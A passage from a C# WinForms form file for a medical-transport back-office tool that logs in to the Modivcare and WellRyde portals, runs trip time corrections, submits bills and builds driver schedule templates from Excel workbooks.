                SaveMCCredentials(username, password);
        }

        /// <summary>If not connected, signs in using Modivcare tab fields or saved settings, then returns whether Modivcare is ready. Caller continues the same action after this returns true.</summary>
        private async Task<bool> EnsureModivcareSessionAsync()
        {
            if (mcLoginHandler != null && mcLoginHandler.Connected)
                return true;

            string username;
            string password;
            if (loginCB.SelectedIndex == 1)
            {
                username = (loginUserTB.Text ?? "").Trim();
                password = loginPassTB.Text ?? "";
            }
            else
            {
                username = (Properties.Settings.Default.mcUserName ?? "").Trim();
                password = Properties.Settings.Default.mcUserPass ?? "";
            }
            if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
            {
                MessageBox.Show("Modivcare is not signed in. Use the Modivcare tab to sign in, or save credentials with Remember credentials.");
                return false;
            }

            await SetLoadingGifLabel("Signing in to Modivcare");
            mcLoginHandler.PropertyChanged -= UpdateMCConnectionStatus;
            try
            {
                await PerformModivcareLoginWithCredentialsAsync(username, password, saveOnSuccess: true);
            }
            finally
            {
                mcLoginHandler.PropertyChanged += UpdateMCConnectionStatus;
            }

            if (!mcLoginHandler.Connected)
            {
                MessageBox.Show("Modivcare login was not accepted.");
                EnableMCLogin();
                return false;
            }
            DisableMCLogin();
            return true;
        }
        private void LoadMCCredentials()
        {
            if (!string.IsNullOrWhiteSpace(Properties.Settings.Default.mcUserName))
            {
                loginCodeTB.Text = "Not Applicable";
                loginUserTB.Text = Properties.Settings.Default.mcUserName;
                loginPassTB.Text = Properties.Settings.Default.mcUserPass ?? "";
                loginSwitch.Checked = true;
            }
            else
            {
                loginCodeTB.Text = "Not Applicable";
                loginUserTB.Text = "";
                loginPassTB.Text = "";
                loginSwitch.Checked = false;
            }
        }
        private void SaveMCCredentials(string user, string pass)
        {
            string username = user;
            string password = pass;

            try
            {
                if (loginSwitch.Checked == false)
                {
                    Properties.Settings.Default.mcUserName = "";
                    Properties.Settings.Default.mcUserPass = "";
                    Properties.Settings.Default.Save();
                }
                else
                {
                    Properties.Settings.Default.mcUserName = username;
                    Properties.Settings.Default.mcUserPass = password;
                    Properties.Settings.Default.Save();
                }
            }
            catch
            {
                Console.WriteLine("There was a problem saving credentials");
            }
        }
        private void EnableMCLogin()
        {
            //loginConnLbl.Text = "Wellryde: Not Connected";
            SetWrPbLightImage(0);
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = true;
            loginPassTB.Enabled = true;
            loginSwitch.Enabled = true;
            loginBtn.Text = "Login";
            loginCB.SelectedIndex = 1;
            loginCB.Focus();
        }
        private void DisableMCLogin()
        {
            //loginConnLbl.Text = "Wellryde: Connected";
            SetWrPbLightImage(1);
            loginCodeTB.Enabled = false;
            loginUserTB.Enabled = false;
            loginPassTB.Enabled = false;
            loginSwitch.Enabled = false;
            loginBtn.Text = "Logout";
            loginCB.SelectedIndex = 1;
        }
        public async void UpdateMCConnectionStatus(object source, EventArgs args)
        {
            if (mcLoginHandler.Connected == true)
            {
                DisableMCLogin();
            }
            else
            {
                EnableMCLogin();
                if (!mcLoginHandler.IntentionalLogout)
                {
                    await SetLoadingGifLabel("Logging into Modivcare");
                    await MCLogin();
                }
            }
        }
















        private async void button1_Click(object sender, EventArgs e)
        {
            await mcLoginHandler.Logout();
            mcLoginHandler.IntentionalLogout = false;
        }

        //Modivcare

        //Time Corrections
        private async void tcfindbatchesbtn_Click(object sender, EventArgs e)
        {
            loadinggifhandler_showscreen();
            await SetLoadingGifLabel("Checking connections");
            if (!await EnsureModivcareSessionAsync())
            {
                loadinggifhandler_hidescreen();
                return;
            }
            tcbatchelinkslv.Items.Clear();
            await mcTimeCorrectionTool.GetBatchLinks(mcLoginHandler, true);
            await SetLoadingGifLabel("Searching for batches");
            try
            {
                foreach (MCBatchLink link in mcTimeCorrectionTool.mcBatchRecords.MCBatchLinks)
                {
                    // Add the record to our listview
                    ListViewItem lvi = new ListViewItem();

                    lvi.Text = link.BatchID;
                    lvi.SubItems.Add(link.CreateDate);
                    lvi.SubItems.Add(link.CreatedBy);
                    lvi.SubItems.Add(link.TripCount);
                    lvi.SubItems.Add(link.FailedTripCount);
                    lvi.SubItems.Add(link.RequiresAttention);
                    lvi.SubItems.Add(link.TotalBilledAmount);
                    tcbatchelinkslv.Items.Add(lvi);
                }
            }
            catch
            {
                Console.WriteLine("No batches found!");
            }
            await SetLoadingGifLabel("Finalizing process..");
            tcorrectstatuslbl.Text = "Status: Search completed with " + mcTimeCorrectionTool.mcBatchRecords.MCBatchLinks.Count + " batches found. To continue, select a batch and click 'LOAD'.'";
            loadinggifhandler_hidescreen();
        }

        MCBatchLink batchlink = new MCBatchLink();
        string tcstatustext = "";
        private async void tcloadbtn_Click(object sender, EventArgs e)
        {
            if (mcTimeCorrectionTool == null)
            {
                tcorrectstatuslbl.Text = "Status: You must click 'Find' to search for batches to load.";
                return;
            }

            if (tcbatchelinkslv.SelectedItems.Count == 0)
            {
                tcorrectstatuslbl.Text = "Status: Please select a batch to continue.";
                return;
            }

            tcorrectstatuslbl.Text = "Status: Attempting to load batch..";
            loadinggifhandler_showscreen();

            await SetLoadingGifLabel("Checking connections");
            if (!await EnsureModivcareSessionAsync())
            {
                loadinggifhandler_hidescreen();
                return;
            }
            WellRydePortalSession wrForBatch = null;
            if (await EnsureWellRydePortalSessionForBillingAsync())
                wrForBatch = _wellRydeSession;
            await mcTimeCorrectionTool.GetBatchLinks(mcLoginHandler, true);

            foreach (MCBatchLink link in mcTimeCorrectionTool.mcBatchRecords.MCBatchLinks)
            {
                if (link.BatchID == tcbatchelinkslv.SelectedItems[0].Text)
                {
                    mcTimeCorrectionTool.mcBatchRecords.ActiveBatchLink = link.BatchLinkToken;
                    batchlink = link;
                    await mcTimeCorrectionTool.InitializeCorrections(mcLoginHandler, link, wrForBatch);
                    await SetLoadingGifLabel("Initializing corrections");
                    await SetLoadingGifLabel("Calculating accuracies");
                    await LoadBtnAsync(batchlink);
                    await SetLoadingGifLabel("Finalizing process..");
                }
            }
            loadinggifhandler_hidescreen();
        }
        private async void tcexebtn_Click(object sender, EventArgs e)
        {
            if (mcTimeCorrectionTool == null)
            {
                tcorrectstatuslbl.Text = "Status: You must click 'Find' to search for batches to load.";
                return;
            }
            
            if (mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips.Count == 0 & mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips != null)
            {
                tcorrectstatuslbl.Text = "Status: No batches loaded.";
                return;
            }
            
            timer1.Enabled = true;
            tcfindbatchesbtn.Enabled = false;
            tcloadbtn.Enabled = false;
            tcexebtn.Enabled = false;
            loadinggifhandler_showscreen();
            await SetLoadingGifLabel("Checking connections");
            if (!await EnsureModivcareSessionAsync())
            {
                timer1.Enabled = false;
                tcfindbatchesbtn.Enabled = true;
                tcloadbtn.Enabled = true;
                tcexebtn.Enabled = true;
                loadinggifhandler_hidescreen();
                return;
            }
            await mcTimeCorrectionTool.GetBatchLinks(mcLoginHandler, false);
            await LoadBtnAsync(batchlink);
            await SetLoadingGifLabel("Preparing to correct trips");
            int fixabletripscounter = 0;
            int currenttripcounter = 0;
            foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
            {
                if (mctrprcd.Status == "Fixable")
                {
                    fixabletripscounter += 1;
                }
            }
            await mcTimeCorrectionTool.GetBatchPage(mcLoginHandler, batchlink.BatchLinkToken, false);

            loadinggifhandler_hidescreen();

            List<MCDriver> drivers = mcTimeCorrectionTool.CalculateAccuracies();

            StartTimer();

            foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
            {
                int numofalerts = 0;

                if (mctrprcd.Status == "Fixable")
                {
                    try
                    {
                        await mcTimeCorrectionTool.GetBatchPage(mcLoginHandler, batchlink.BatchLinkToken, false);
                        foreach (ListViewItem itemRow in this.tctripcorrectlv.Items)
                        {
                            if (itemRow.SubItems[1].Text == (mctrprcd.Date + "-" + mctrprcd.Trip))
                            {
                                currenttripcounter += 1;
                                tcstatustext = "Status: Fixing " + currenttripcounter + " of " + fixabletripscounter + " fixable trips.";

                                itemRow.UseItemStyleForSubItems = false;
                                itemRow.BackColor = Color.OrangeRed;
                                itemRow.ForeColor = Color.Black;
                                itemRow.Text = "Delaying..";
                            }
                        }

                        await Task.Delay(5000);
                        await mcTimeCorrectionTool.GetDriverPageForSubit(mcLoginHandler, mctrprcd);

                        foreach (ListViewItem itemRow in this.tctripcorrectlv.Items)
                        {
                            if (itemRow.SubItems[1].Text == (mctrprcd.Date + "-" + mctrprcd.Trip))
                            {
                                itemRow.Text = "Sending";
                                await Task.Delay(2000);
                                await mcTimeCorrectionTool.SubmitTrip(mcLoginHandler, mctrprcd);
                                await Task.Delay(2000);
                                itemRow.Text = mctrprcd.Status;
                                if (mctrprcd.Status == "Passed")
                                {
                                    mctrprcd.Alerts = "";
                                    //itemRow.SubItems[2].Text = "";
                                    itemRow.UseItemStyleForSubItems = false;
                                    itemRow.BackColor = Color.ForestGreen;
                                    itemRow.ForeColor = Color.Black;
                                }
                                else
                                {
                                    itemRow.UseItemStyleForSubItems = false;
                                    itemRow.BackColor = Color.DarkRed;
                                    itemRow.ForeColor = Color.Black;
                                }
                                break;
                            }
                        }
                    }
                    catch 
                    {
                        mctrprcd.Status = "Failed";
                    }
                }
            }
            timer1.Stop();
            tcfindbatchesbtn.Enabled = true;
            tcloadbtn.Enabled = true;
            tcexebtn.Enabled = true;
            tcorrectstatuslbl.Text = "Status: Corrections have finished " + currenttripcounter + " of " + fixabletripscounter + " trips.";
        }
        TimeSpan ts = new TimeSpan();
        private void StartTimer()
        {
            int fixabletripscounter = 0;
            foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
            {
                if (mctrprcd.Status == "Fixable")
                {
                    fixabletripscounter += 1;
                }
            }

            int timelefsecs = (fixabletripscounter * 10);
            ts = TimeSpan.FromSeconds(timelefsecs);

            timer1.Start();
        }
        int tensecs = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            tensecs ++;
            ts = ts - new TimeSpan(0,0,1);

            if (tensecs == 10)
            {
                int fixabletripscounter = 0;
                foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
                {
                    if (mctrprcd.Status == "Fixable")
                    {
                        fixabletripscounter += 1;
                    }
                }

                int timelefsecs = (fixabletripscounter * 10);
                ts = TimeSpan.FromSeconds(timelefsecs);
                tensecs = 0;
            }
            tcorrectstatuslbl.Text = tcstatustext + " Estimated time to complete: " + ts;
        }
        private async Task LoadBtnAsync(MCBatchLink link)
        {

                    DrawAccuracyChart(mcTimeCorrectionTool.CalculateAccuracies());

                    tctripcorrectlv.Items.Clear();
                    foreach (MCBatchTripRecord triprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
                    {
                        triprcd.BatchLink = link.BatchLinkToken;
                        ListViewItem lvi = new ListViewItem();
                        lvi.Text = triprcd.Status;


                        lvi.SubItems.Add(triprcd.Date + "-" + triprcd.Trip);
                        lvi.SubItems.Add(triprcd.Alerts);
                        lvi.SubItems.Add(triprcd.Driver);
                        lvi.SubItems.Add(triprcd.ScheduledPUTime);
                        lvi.SubItems.Add(triprcd.ScheduledDOTime);
                        lvi.SubItems.Add(triprcd.PUTime);
                        lvi.SubItems.Add(triprcd.DOTime);
                        lvi.SubItems.Add(triprcd.SuggestedPUTime);
                        lvi.SubItems.Add(triprcd.SuggestedDOTime);
                        //if &nbsp; found replace with empty space
                        if (triprcd.RiderCallTime.Contains("&nbsp;"))
                        {
                            lvi.SubItems.Add("");
                        }
                        else
                        {
                            lvi.SubItems.Add(triprcd.RiderCallTime);
                        }
                        if (triprcd.Vehicle.Contains("&nbsp;"))
                        {
                            lvi.SubItems.Add("");
                        }
                        else
                        {
                            lvi.SubItems.Add(triprcd.Vehicle);
                        }
                        lvi.SubItems.Add(triprcd.SignatureReceived);
                        lvi.SubItems.Add(triprcd.CoPay);
                        lvi.SubItems.Add(triprcd.BilledAmount);
                        lvi.SubItems.Add(triprcd.RequiresAttention);
                        tctripcorrectlv.Items.Add(lvi);
                    }
                    int fixabletripscounter = 0;
                    foreach (MCBatchTripRecord mctrprcd in mcTimeCorrectionTool.mcBatchRecords.MCBatchTrips)
                    {
                        if (mctrprcd.Status == "Fixable")
                        {
                            fixabletripscounter += 1;
                        }
                    }


            int timelefsecs = (fixabletripscounter * 10);
            TimeSpan ts = TimeSpan.FromSeconds(timelefsecs);
            tctripcorrectlv.Columns[2].Text = "Alerts: " + mcTimeCorrectionTool.ReturnAlertCount().ToString();
            tcstatustext = "Status: Batch " + link.BatchID + " loaded with " + fixabletripscounter + " fixable trips.";
            tcorrectstatuslbl.Text = tcstatustext + " Estimated time to complete: " + ts;
        }

        //Wellryde billing
        private async void billloadButton_Click(object sender, EventArgs e)
        {
            ShowLoadingGif();
            try
            {
                await SetLoadingGifLabel("Loading trips");
                WellRydePortalFilterDataResult reloadResult;
                int portalTotalRecords;
                try
                {
                    (reloadResult, portalTotalRecords) = await ReloadBillingTripsFromPortalWithAuthRetryAsync();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("WellRyde filterdata: " + ex.Message);
                    return;
                }
                if (!reloadResult.IsSuccess)
                {
                    var prefix = reloadResult.StatusCode.HasValue
                        ? "HTTP " + (int)reloadResult.StatusCode.Value + " — "
                        : "";
                    MessageBox.Show(prefix + (reloadResult.ErrorMessage ?? "filterdata failed."));
                    return;
                }

                BindBillingListViewFromWrTool(0, false, false);
                var trips = wrBillingTool.WRTripList;
                if (portalTotalRecords > 0 && trips != null && trips.Count != portalTotalRecords)
                {
                    billingstatuslbl.Text = "Status: WellRyde reports " + portalTotalRecords + " trips; " + trips.Count +
                        " rows parsed for " + rjDatePicker1.Value.ToLongDateString() + ". " +
                        wrBillingTool.WRCalculations.CalculateBillableTripCount(billingmmcb.CheckState, billingallcb.CheckState) +
                        " billable, $" + wrBillingTool.WRCalculations.CalculateActualBillTotal(billingmmcb.CheckState, billingallcb.CheckState) + ".";
                }
            }
            finally
            {
                hidegiftimer.Start();
            }
        }

        /// <summary>
        /// Fills <see cref="billinglistview"/> from <see cref="WRBillingTool.WRTripList"/> / <see cref="WRBillingTool.WRCalculations"/>.
        /// </summary>
        private void BindBillingListViewFromWrTool(decimal totalbilled, bool billinprogress, bool billexrta)
        {
            if (wrBillingTool?.WRTripList == null || wrBillingTool.WRCalculations == null)
                return;

            try
            {
                Dictionary<WRDownloadedTrip, WRDownloadedTrip> mismatchtrips = wrBillingTool.FindTripPriceMismatches();
                billinglistview.Items.Clear();
                foreach (WRDownloadedTrip trip in wrBillingTool.WRTripList)
                {
                    string alertseries = "";
                    foreach (string alert in trip.Alerts)
                    {
                        if (alertseries != "")
                            alertseries = alertseries + ", " + alert;
                        else
                            alertseries = alert;
                    }

                    ListViewItem item = new ListViewItem();
                    item.Tag = trip;
                    item.Text = trip.Status;
                    item.SubItems.Add(trip.TripNumber);
                    item.SubItems.Add(alertseries);
                    item.SubItems.Add(trip.ClientName);
                    item.SubItems.Add(trip.DriverName);
                    item.SubItems.Add(trip.PUTime);
                    item.SubItems.Add(trip.DOTime);
                    item.SubItems.Add(trip.PUStreet);
                    item.SubItems.Add(trip.PUCity);
                    item.SubItems.Add(trip.DOStreet);
                    item.SubItems.Add(trip.DOCITY);
                    item.SubItems.Add(trip.Miles);
                    item.SubItems.Add("$" + trip.Price);
                    item.SubItems.Add(trip.References);
                    billinglistview.Items.Add(item);
                    foreach (KeyValuePair<WRDownloadedTrip, WRDownloadedTrip> mmtrip in mismatchtrips)
                    {
                        if (mmtrip.Key.TripNumber == trip.TripNumber)
                            item.BackColor = Color.OrangeRed;
                    }
                }
                if (wrBillingTool.WRCalculations.CalculateBillableTripCount(billingmmcb.CheckState, billingallcb.CheckState) == 0)
                {
                    if (!billinprogress)
                    {
                        billingstatuslbl.Text = "Status: " + wrBillingTool.WRTripList.Count.ToString() + " trips have been loaded for " + rjDatePicker1.Value.ToLongDateString() + ". " + wrBillingTool.WRCalculations.CalculateBillableTripCount(billingmmcb.CheckState, billingallcb.CheckState) + " trips are billable for a total of $" + wrBillingTool.WRCalculations.CalculateActualBillTotal(billingmmcb.CheckState, billingallcb.CheckState) + ".";
                    }
                    else
                    {
                        billinprogress = false;
                        billingstatuslbl.Text = "Status: " + wrBillingTool.WRTripList.Count.ToString() + " trips have been loaded for " + rjDatePicker1.Value.ToLongDateString() + ". " + wrBillingTool.WRCalculations.CalculateBillableTripCount(billingmmcb.CheckState, billingallcb.CheckState) + " trips are billable for a total of $" + wrBillingTool.WRCalculations.CalculateActualBillTotal(billingmmcb.CheckState, billingallcb.CheckState) + ".";
                    }
                }
                else
                {
                    if (!billinprogress)
                    {
                        billingstatuslbl.Text = "Status: " + wrBillingTool.WRTripList.Count.ToString() + " trips have been loaded for " + rjDatePicker1.Value.ToLongDateString() + ". " + wrBillingTool.WRCalculations.CalculateBillableTripCount(billingmmcb.CheckState, billingallcb.CheckState) + " trips are billable for a total of $" + wrBillingTool.WRCalculations.CalculateActualBillTotal(billingmmcb.CheckState, billingallcb.CheckState) + ". Click 'SUBMIT' to submit.";
                    }
                    else
                    {
                        billinprogress = false;
                        billingstatuslbl.Text = "Status: Bill has been submitted. Trips may take some time to arrive for corrections.";
                    }
                }
                billinglistview.Columns[2].Text = "Alerts: " + wrBillingTool.WRCalculations.GetAlertCount().ToString();
            }
            catch (Exception) { }
            wrBillingTool.WRCalculations.CheckIfAllTripsAreBeingBilled(billingmmcb.CheckState, billingallcb.CheckState);
        }

        private List<BillableTrip> billedtrips = new List<BillableTrip>();
        private async Task populateBillingList(decimal totalbilled, bool billinprogress, bool billexrta)
        {
            try
            {
                var (reloadResult, _) = await ReloadBillingTripsFromPortalWithAuthRetryAsync();
                if (!reloadResult.IsSuccess)
                    Console.WriteLine("Billing list refresh: " + (reloadResult.ErrorMessage ?? "filterdata failed."));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Billing list refresh: " + ex.Message);
            }

            Console.WriteLine(rjDatePicker1.Value.ToLongDateString());
            BindBillingListViewFromWrTool(totalbilled, billinprogress, billexrta);
        }
        private async void billsubmitbtn_Click(object sender, EventArgs e)
        {
            loadinggifhandler_showscreen();
            
            //billtimer.Enabled = true;
            bool billall = false;
            
            decimal billedtotal = Math.Round(wrBillingTool.WRCalculations.CalculateSimpleBillableTotal(), 2, MidpointRounding.AwayFromZero);
            if (billingallcb.CheckState == CheckState.Checked)
            {
                await SetLoadingGifLabel("Using the bill all feature will bill trips drivers are still on. Continue?");
                DialogResult dialogResult = MessageBox.Show("Selecting 'Bill All' can result in billing trips that drivers are still on. Continue?", "Warning!", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    billall = true;
                }
                else if (dialogResult == DialogResult.No)
                {
                    await SetLoadingGifLabel("Cancelling bill submit");
                    loadinggifhandler_hidescreen();
                    return;
                }
            }

            billtimer.Enabled = true;
            
            await SetLoadingGifLabel("Checking connections");
            try
            {
                if (!await EnsureWellRydePortalSessionForBillingAsync())
                {
                    loadinggifhandler_hidescreen();
                    return;
                }
                if (_wellRydeSession == null)
                {
                    MessageBox.Show("WellRyde portal session is not available. Sign in on the WellRyde tab and try again.");
                    loadinggifhandler_hidescreen();
                    return;
                }
                billedtrips = await wrBillingTool.SendBill(_wellRydeSession, billingmmcb.CheckState, billingallcb.CheckState);
                await SetLoadingGifLabel("Waiting for trips to arrive. 0 / " + billedtrips.Count + " trips billed..");
            }
            catch (NullReferenceException)
            {
                MessageBox.Show("You haven't loaded a list yet.");
                loadinggifhandler_hidescreen();
                return;
            }
            catch (InvalidOperationException ex)
            {
                MessageBox.Show("Billing submit failed: " + ex.Message);
                loadinggifhandler_hidescreen();
                return;
            }

            if (billedtrips.Count == 0)
            {
                await SetLoadingGifLabel("No billable trips detected.. Exiting");
                loadinggifhandler_hidescreen();
                //LoadingGifSkipBtn.Visible = false;
                return;
            }
            else
            {
                //loadinggifhandler_hidescreen();
                await populateBillingList(billedtotal, true, billall);
                DrawPriceGroupChart(wrBillingTool.WRCalculations.CalculateBillablePriceGroups());
                billtimer.Start();
            }
            
        }

        int billed_trips_counter = 0;
        private async Task CheckForBillCompletion(List<BillableTrip> tripsbilled)
        {
            billed_trips_counter = 0;
            try
            {
                var (reloadResult, _) = await ReloadBillingTripsFromPortalWithAuthRetryAsync();
                if (!reloadResult.IsSuccess)
                    Console.WriteLine("Bill completion refresh: " + (reloadResult.ErrorMessage ?? "filterdata failed."));
            }
            catch (Exception ex)
            {
                Console.WriteLine("Bill completion refresh: " + ex.Message);
            }

            bool found_trip_not_billed = false;
            int billable_trip_counter = tripsbilled.Count;
            
            foreach (BillableTrip bt in tripsbilled)
            {
                foreach (WRDownloadedTrip wrdt in wrBillingTool.WRTripList)
                {
                    if (wrdt.TripUUID == bt.tripUUID)
                    {
                        if (wrdt.Status != "Billed")
                        {
                            found_trip_not_billed = true;
                        }
                        else
                        {
                            billed_trips_counter++;
                        }
                    }
                }
            }

            await SetLoadingGifLabel("Waiting for trips to arrive. " + billed_trips_counter.ToString() + " / " + billable_trip_counter + " trips billed..");
            if (!found_trip_not_billed)
            {
                Console.WriteLine("Found all trips!");
                billtimer.Stop();
                loadinggifhandler_hidescreen();
            }
            else
            {
                Console.WriteLine("There were some trips not billed yet.");
            }
        }












        private void timekiller_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            timekiller.Stop();
        }
        private void hidegiftimer_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            LoadingGifSkipBtn.Visible = false;
            HideLoadingGif();
            hidegiftimer.Stop();
            
        }
        private async void billtimer_Tick(object sender, EventArgs e)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            if (billedtrips.Count == 0)
            {
                loadinggifhandler_hidescreen();
                billtimer.Stop();
            }
            else
            {
                LoadingGifSkipBtn.Visible = true;
                await CheckForBillCompletion(billedtrips);
            }
        }
        private async Task SetLoadingGifLabel(string txt)
        {
            if (_applicationExitRequested)
                return;
            ApplyLoadingGifLabel(txt);
            await Task.Yield();
        }

        private void GifWorker_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
        {
            ApplyLoadingGifLabel(e.Argument as string);
        }

































        private string splitwellrydename(string name)
        {

            string a = name.Substring(0, 1);
            string b = name.Substring(1, 5);

            string newname = char.ToUpper(a[0]) + " " + char.ToUpper(b[0]) + b.Substring(1);
            return newname;
        }



















        private string GetFilterDate()
        {
            //return string should be similar to "November+19%2C+2022"
            string finalmonth;

            //Get month as string
            string datefilter = rjDatePicker1.Value.ToLongDateString();
            //Console.WriteLine(datefilter);
            //Get month from between commas
            string monthandday = Regex.Match(datefilter, @"(?<=^([^,]*,){1})([^,]*)").Value;
            //Console.WriteLine(monthandday);
            //Get month from between spaces
            string actualmonth = Regex.Match(monthandday, @"(?<=^([^ ]* ){1})([^ ]*)").Value;
            finalmonth = actualmonth;
            //Console.WriteLine(actualmonth);
            //Get month complete

            //Console.WriteLine(finalmonth + "+" + dateTimePicker1.Value.Day + "%2C+" + dateTimePicker1.Value.Year);
            return finalmonth + "+" + rjDatePicker1.Value.Day + "%2C+" + rjDatePicker1.Value.Year;




        }
        private string GetCurrentDate()
        {
            //return string should be similar to "November+19%2C+2022"
            DateTime localDate = DateTime.Now;


            string month = DateTime.Now.ToString("MMMM");
            string day = DateTime.Now.ToString("dd");
            string year = DateTime.Now.ToString("yyyy");
            Console.WriteLine(month + "+" + day + "%2C+" + year);
            return month + "+" + day + "%2C+" + year;
        }
        public string SplitDriverName(string driverrname)
        {
            string[] uncleanfirstandlast = driverrname.Split(new string[] { "," }, StringSplitOptions.None);
            string firstname = uncleanfirstandlast[0].Replace(" ", "");
            string firstnameafter = char.ToUpper(firstname.First()) + firstname.Substring(1).ToLower();

            string[] uncleanlast = uncleanfirstandlast[1].Split(' ');
            string lastname = uncleanlast[1].Replace(" ", "");
            string lastnameafter = char.ToUpper(lastname.First()) + lastname.Substring(1).ToLower();

            return lastnameafter + " " + firstnameafter;
        }

        //templates
        private async void addtemplatebtn_Click(object sender, EventArgs e)
        {
            loadinggifhandler_showscreen();
            await SetLoadingGifLabel("Starting template builder…");

            if (string.IsNullOrWhiteSpace(tbcb.Text))
            {
                MessageBox.Show(
                    this,
                    "Choose the weekday (Monday through Sunday) in the list at the top of this tab before adding a template.\n\n" +
                    "That tells the app which folder to save the driver CSV files into (for example, the Monday folder).",
                    "Templates",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
                loadinggifhandler_hidescreen();
                return;
            }

            await SetLoadingGifLabel("Select a schedule file for templates");
            OpenFileDialog openFileDialog1 = new OpenFileDialog
            {
                InitialDirectory = System.Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Title = "Choose a schedule workbook to turn into templates",

                CheckFileExists = true,
                CheckPathExists = true,

                DefaultExt = ".xlsx",
                Filter = "workbook files (*.xlsx)|*.xlsx",
                FilterIndex = 2,
                RestoreDirectory = true
            };

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                tbuilder.TargetWeekdayName = tbcb.Text.Trim();
                tbuilder.TemplateNameOfFileToLoad = openFileDialog1.FileName;
                await SetLoadingGifLabel("Exporting tabs to CSV and validating layout…");
                tbuilder.StartTemplateBuilder();

                if (tbuilder.BadScheduleScan)
                {
                    await SetLoadingGifLabel("Validation failed");
                    loadinggifhandler_hidescreen();
                    tbstatuslbl.Text = "Status: Fix the issues in the message, then try Add Template again.";
                    MessageBox.Show(this, tbuilder.FormatBadScheduleUserMessage(), "Template validation", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    tbuilder.ClearTemplateWorkingFolder();
                    return;
                }

                if (string.IsNullOrWhiteSpace(tbuilder.TemplateNameOfDay))
                {
                    await SetLoadingGifLabel("Could not determine save folder");
                    loadinggifhandler_hidescreen();
                    tbstatuslbl.Text = "Status: Pick a weekday on this tab, then try again.";
                    MessageBox.Show(
                        this,
                        "The app could not confirm which weekday folder to use.\n\n" +
                        "Make sure a day (Monday–Sunday) is selected above, then run Add Template again.",
                        "Templates",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    tbuilder.ClearTemplateWorkingFolder();
                    return;
                }

                var replaced = await tbuilder.TryRunReplaceTemplatesDialogAsync(this);
                if (!replaced)
                {
                    loadinggifhandler_hidescreen();
                    tbstatuslbl.Text = "Status: Template replace was cancelled; working files were cleared.";
                    return;
                }

                if (tbuilder.ScheduleWeekdayMismatchWarning && !string.IsNullOrEmpty(tbuilder.InferredWeekdayFromSchedule))
                {
                    MessageBox.Show(
                        this,
                        "Trip dates in this workbook repeat like a " + tbuilder.InferredWeekdayFromSchedule +
                        " schedule, but you had selected " + tbuilder.TargetWeekdayName +
                        " on the Templates tab.\n\n" +
                        "Files were saved under the folder for " + tbuilder.TargetWeekdayName +
                        ".\n\nIf that is wrong, select the correct weekday and run Add Template again with the same file.",
                        "Weekday check",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Information);
                }

                for (int i = 0; i < tbcb.Items.Count; i++)
                {
                    string value = tbcb.GetItemText(tbcb.Items[i]);
                    try
                    {
                        if (value.Contains(tbuilder.TemplateNameOfDay))
                        {
                            tbtemplatenamecb.Items.Clear();
                            templatelv.Items.Clear();
                            try
                            {
                                tbcb.SelectedIndex = i + 1;
                            }
                            catch
                            {
                                tbcb.SelectedIndex = i - 1;
                            }

                            tbcb.SelectedIndex = i;
                            tbcb.Text = value;
                        }
                    }
                    catch (Exception)
                    {
                    }
                }

                tbstatuslbl.Text = "Status: Templates saved for " + tbuilder.TemplateNameOfDay + ".";
                loadinggifhandler_hidescreen();
            }
            else
            {
                await SetLoadingGifLabel("Cancelled");
                loadinggifhandler_hidescreen();
            }
        }

        //Full schedule builder
        private async void fsbtn_Click(object sender, EventArgs e)
        {
            loadinggifhandler_showscreen();
            fsbdatepicker.Enabled = false;
            fsbtn.Enabled = false;
            string dayname = fsbdatepicker.Value.DayOfWeek.ToString();
            string day = fsbdatepicker.Value.Day.ToString();
            string nameofmonth = fsbdatepicker.Value.ToString("MMMM");
            string month = fsbdatepicker.Value.Month.ToString();
            string year = fsbdatepicker.Value.Year.ToString();

            try
            {
                await SetLoadingGifLabel("Checking connections");
                if (!await EnsureModivcareSessionAsync())
                {
                    loadinggifhandler_hidescreen();
                    fsbtn.Enabled = true;
                    fsbdatepicker.Enabled = true;
                    sbstatuslbl.Text = "Status: Modivcare sign-in required.";
                    return;
                }
                fsbuilder = new FullScheduleBuilder(dayname, day, nameofmonth, month, year);
                fsbuilder.UpdateLoadingScreen += loadinggifhandler_update;
                fsbuilder.ShowLoadingScreen += loadinggifhandler_showscreen;
                fsbuilder.HideLoadingScreen += loadinggifhandler_hidescreen;
                await fsbuilder.BuildFullSchedule(fsbdatepicker.Value, mcLoginHandler);
            }
            catch (ScheduleBuilderException ex)
            {
                loadinggifhandler_hidescreen();
                fsbtn.Enabled = true;
                fsbdatepicker.Enabled = true;
                MessageBox.Show(
                    this,
                    "Schedule build stopped before the workbook was finished.\n\n" + ex.Message,
                    "Schedule Builder",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Warning);
                sbstatuslbl.Text = "Status: Schedule build failed. See message for details.";
                return;
            }
            catch (Exception ex)
            {
                loadinggifhandler_hidescreen();
                fsbtn.Enabled = true;
                fsbdatepicker.Enabled = true;
                MessageBox.Show(
                    "Unexpected error while building schedule.\n\n" + ex.Message,
                    "Schedule Builder Error",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                sbstatuslbl.Text = "Status: Schedule build failed.";
